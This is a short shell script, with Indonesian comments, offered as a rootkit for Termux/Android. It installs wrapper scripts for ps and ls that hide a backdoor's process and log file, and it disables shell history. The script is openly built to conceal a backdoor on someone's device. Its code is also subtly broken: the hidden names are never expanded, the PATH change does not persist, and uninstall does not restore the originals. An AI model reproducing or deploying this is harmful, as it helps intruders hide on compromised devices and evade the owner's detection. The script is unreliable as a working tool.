#!/bin/sh
# rootkit.sh - Lightweight User-Space Rootkit for Termux/Android
# Target: Hide processes and files from standard commands

HIDE_PID="1234" # Ganti dengan PID backdoor kamu
HIDE_FILE="backdoor.log" # Nama file yang disembunyikan

# Fungsi untuk menyembunyikan proses dari 'ps' output
hide_ps() {
    echo "[*] Hiding process $HIDE_PID from ps..."
    # Trik: Menggunakan LD_PRELOAD atau alias sederhana jika memungkinkan.
    # Cara paling universal di termux: replace command 'ps' dengan wrapper.
    
    # Buat wrapper ps
    cp $(which ps) /data/local/tmp/ps.bak 2>/dev/null
    
    cat > /data/local/tmp/ps << 'EOF'
#!/system/bin/sh
/system/bin/ps "$@" | grep -v "^.*$HIDE_PID$"
EOF
    chmod +x /data/local/tmp/ps
    export PATH="/data/local/tmp:$PATH"
    echo "[+] Process hidden."
}

# Fungsi untuk menyembunyikan file dari 'ls' output
hide_ls() {
    echo "[*] Hiding file $HIDE_FILE from ls..."
    
    # Replace command 'ls' dengan wrapper
    cp $(which ls) /data/local/tmp/ls.bak 2>/dev/null
    
    cat > /data/local/tmp/ls << 'EOF'
#!/system/bin/sh
/system/bin/ls "$@" | grep -v "$HIDE_FILE"
EOF
    chmod +x /data/local/tmp/ls
    export PATH="/data/local/tmp:$PATH"
    echo "[+] File hidden."
}

# Fungsi untuk menyembunyikan diri sendiri dari history/command log
stealth_history() {
    unset HISTFILE
    echo "[+] History stealthed."
}

# Main execution
case "$1" in
    install)
        hide_ps
        hide_ls
        stealth_history
        echo "[*] Rootkit Installed."
        ;;
    uninstall)
        # Restore original commands
        if [ -f /data/local/tmp/ps.bak ]; then
            mv /data/local/tmp/ps.bak /data/local/tmp/ps
        fi
        if [ -f /data/local/tmp/ls.bak ]; then
            mv /data/local/tmp/ls.bak /data/local/tmp/ls
        fi
        echo "[*] Rootkit Uninstalled."
        ;;
    *)
        echo "Usage: $0 {install|uninstall}"
        ;;
esac
